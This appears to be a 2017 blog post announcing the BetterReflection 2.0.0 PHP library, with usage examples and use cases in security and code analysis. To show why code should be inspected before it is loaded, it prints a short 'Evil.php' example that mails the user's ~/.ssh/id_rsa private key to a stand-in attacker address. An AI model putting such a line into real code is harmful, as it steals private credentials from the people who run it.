---
layout: post
title: BetterReflection version 2.0.0 released
category: Security
tags: ["PHP", "Library", "Roave", "Clean Code", "Tools"]
year: 2017
month: 9
day: 18
published: true
summary: BetterReflection version 2 was released: let's look at its main features and improvements
description: BetterReflection is a library that aims at providing additional and improved Reflection API compared to PHP's ext-reflection
tweet: 
---
<p>
    <a href="https://twitter.com/RoaveTeam" target="_blank" rel="fn org">Roave</a>'s
    <a href="https://github.com/Roave/BetterReflection" target="_blank">BetterReflection</a>
    <a href="https://github.com/Roave/BetterReflection/releases/tag/2.0.0" target="_blank">2.0.0s</a>
    was released today!
</p>

<p>
    I and <a href="http://twitter.com/asgrim" target="_blank">James Titcumb</a> started working on this
    project back in 2015, and it is a pleasure to see it reaching maturity.
</p>

<p>
    The initial idea was simple: James would implement all my wicked ideas, while I
    would lay back and get drunk on Drambuie.
</p>

<p>
    <img
        src="../../img/posts/2017-09-18-roave-better-reflection-v2.0.0/drunken-coding.jpg"
        alt="Me, drunk in bed. Photo by @Asgrim, since I was too drunk to human"
    />
</p>

<p>
    Yes, that actually happened. Thank you, James, for all the hard work! 🍻
</p>

<p>
    <small>(I did some work too, by the way!)</small>
</p>

<h3>What the heck is BetterReflection?</h3>

<p>
    Jokes apart, the project is quite ambitious, and it aims at reproducing the entirety of the PHP
    reflection API without having any actual autoloading being triggered.
</p>

<p>
    When put in use, it looks like this:
</p>

~~~php
<?php

// src/MyClass.php

namespace MyProject;

class MyClass
{
    public function something() {}
}
~~~

~~~php
<?php

// example1.php

use MyProject\MyClass;
use Roave\BetterReflection\BetterReflection;
use Roave\BetterReflection\Reflection\ReflectionMethod;

require_once __DIR__ . '/vendor/autoload.php';

$myClass = (new BetterReflection())
    ->classReflector()
    ->reflect(MyClass::class);

$methodNames = \array_map(function (ReflectionMethod $method) : string {
    return $method->getName();
}, $myClass->getMethods());

\var_dump($methodNames);

// class was not loaded:
\var_dump(\sprintf('Class %s loaded: ', MyClass::class));
\var_dump(\class_exists(MyClass::class, false));
~~~

<p>
    As you can see, the difference is just in how you bootstrap the reflection API.
</p>

<p>
    Also, we do provide a fully backwards-compatible reflection API that you can use
    if your code heavily relies on <code>ext-reflection</code>:
</p>

~~~php
<?php

// example2.php

use MyProject\MyClass;
use Roave\BetterReflection\BetterReflection;
use Roave\BetterReflection\Reflection\Adapter\ReflectionClass;

require_once __DIR__ . '/vendor/autoload.php';

$myClass = (new BetterReflection())
    ->classReflector()
    ->reflect(MyClass::class);

$reflectionClass = new ReflectionClass($myClass);

// You can just use it wherever you had `ReflectionClass`!
\var_dump($reflectionClass instanceof \ReflectionClass);
\var_dump($reflectionClass->getName());
~~~

<p>
    How does that work?
</p>

<p>
    The operational concept is quite simple, really:
</p>

<ol>
    <li>
        We scan your codebase for files matching the one containing your class.
        This is fully configurable, but by default we use some ugly autoloader
        hacks to find the file without wasting disk I/O.
    </li>
    <li>
        We feed your PHP file to <a href="https://github.com/Nikic/PhpParser" target="_blank">PhpParser</a>
    </li>
    <li>
        We analyse the produced <abbr title="Abstract Syntax Tree">AST</abbr> and
        wrap it in a matching <code>Roave\BetterReflection\Reflection\*</code>
        class instance, ready for you to consume it.
    </li>
</ol>

<p>
    The hard part is tracking the miriad of details of the PHP language,
    which is very complex and cluttered with scope, visibility and inheritance
    rules. We take care of that work for you.
</p>

<h3>Use cases</h3>

<p>
    The main use-cases for BetterReflection are most likely around security, code
    analysis and <abbr title="Ahead of Time">AOT</abbr> compilation.
</p>

<p>
    One of the most immediate use-cases will likely be in
    <a href="https://github.com/phpstan/phpstan" target="_blank">PHPStan</a>, which
    will finally be able to inspect hideous mixed OOP/functional/procedural code
    if <a href="https://github.com/phpstan/phpstan/issues/67" target="_blank">
        the current WIP implementation
    </a> works as expected.
</p>

<p>
    Since you can now "work" with code before having loaded it, you can harden API
    around a lot of security-sensitive contexts. A serializer may decide
    to not load a class if side-effects are contained in the file declaring it:
</p>

~~~php
<?php

// Evil.php
\mail(
    'haxxor@evil.com',
    'All ur SSH keys are belong to us',
    \file_get_contents('~/.ssh/id_rsa')
);

// you really don't want to autoload this bad one:
class Evil {}
~~~

<p>
    The same goes for classes implementing malicious <code>__destruct</code> code,
    as well as classes that may trigger autoloading of other malicious code.
</p>

<p>
    It is also possible to analyse code that is downloaded from the internet without
    actually running it. For instance, code may be checked against GPG signatures in
    the file signature before being run, effectively allowing PHP to "run only signed code".
    <a href="https://getcomposer.org/" target="_blank">Composer</a>, anybody?
</p>

<p>
    If you are more into code analysis, you may decide to compare two different
    versions of a library, and scan for <abbr title="Backwards Compatibility>BC</abbr>
    breaks:
</p>

~~~php
<?php
// the-library/v1/src/SomeApi.php

class SomeAPI
{
    public function sillyThings() { /* ... */ }
}
~~~

~~~php
<?php
// the-library/v2/src/SomeApi.php

class SomeAPI
{
    public function sillyThings(UhOh $bcBreak) { /* ... */ }
}
~~~

<p>
    In this scenario, somebody added a mandatory parameter to <code>SomeAPI#sillyThings()</code>,
    effectively introducing a BC break that is hard to detect without having both versions of the
    code available, or a good migration documentation (library developers: please document this
    kind of change!).
</p>

<h3>Future use cases?</h3>

<p>
    In addition to the above use-case scenarios, we are working on additional
    functionality that would allow changing code before loading it. 
</p>
<p>
    Is that a good idea?
</p>
    ... I honestly don't know.
</p>

<p>
    Still, there are proper use-case scenarios around
    <abbr title="Aspect Oriented Programming">AOP</abbr> and proxying libraries,
    which would then be able to work even with <code>final</code> classes.
</p>

<p>
    You will likely see these features appear in a new, separate library.
</p>

<h3>Credits</h3>